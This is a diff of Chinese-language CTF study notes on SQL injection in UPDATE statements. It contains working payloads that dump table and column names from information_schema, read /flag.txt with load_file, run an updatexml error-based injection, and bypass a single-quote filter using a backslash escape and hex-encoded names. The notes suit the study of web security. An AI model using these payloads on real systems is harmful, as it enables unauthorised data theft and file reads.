@@ -44,14 +44,49 @@ $sql = "update `user` set `address`='".$address."', `old_address`='".$row['addre
 update语句中，在update后面有注入，
 即old_address=$row['address']
 ```
-1、修改前面字段值
+#### **1、修改前面字段值**
 ```
 可以通过注入修改此时的前面字段的值，如address字段
 ',`address`=database()#
 
 ',`address`=(select(load_file("/flag.txt")))#
 ```
-2、where报错注入
+相似的
+```
+名
+password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&username=1
+名
+password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#&username=1
+字段
+password=1',username=(select flagas from flaga) where 1=1#&username=1
+```
+
+绕过过滤了单引号
+```
+给password传\，让\' where username =闭合
+$sql = "update ctfshow_user set pass = '\' where username = '{$username}';";
+
+password=\&username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
+>banlist,ctfshow_user,flag23a
+
+password=\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#
+因为过滤了单引号，所以16进制绕过。>id,flagass23s3,info
+
+password=\&username=,username=(select flagass23s3 from flag23a)#
+```
+
+
+^
+#### **2、where报错注入**
 ```
 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
 ```
+
+
+
+
+
+
+^
+## **delete注入**
+用时间或布尔盲注
